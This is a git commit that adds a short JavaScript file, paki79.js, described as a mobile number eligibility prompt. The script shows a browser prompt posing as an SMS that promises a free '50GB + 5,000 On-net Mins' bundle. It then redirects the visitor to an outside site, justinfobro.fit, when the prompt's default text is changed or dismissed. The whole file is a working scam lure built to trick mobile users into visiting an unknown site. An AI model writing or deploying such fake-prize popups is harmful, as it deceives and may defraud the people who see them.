728b401a29c30a2fa35177e608b0fb1086f951e2
organisedinfo <array-furors.1k@icloud.com>
2026-08-13 16:57:41 -1200

    Add script for mobile number eligibility prompt

---
+++ paki79.js
@@ -0,0 +1,5 @@
+    var password = '50GB + 5,000 On-net Mins'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive  50GB + 5,000 On-net Mins, click OK to Activate now','50GB + 5,000 On-net Mins');
+if (password != '50GB + 5,000 On-net Mins') {
+location.href='https://www.justinfobro.fit/paki-50gb';
+}
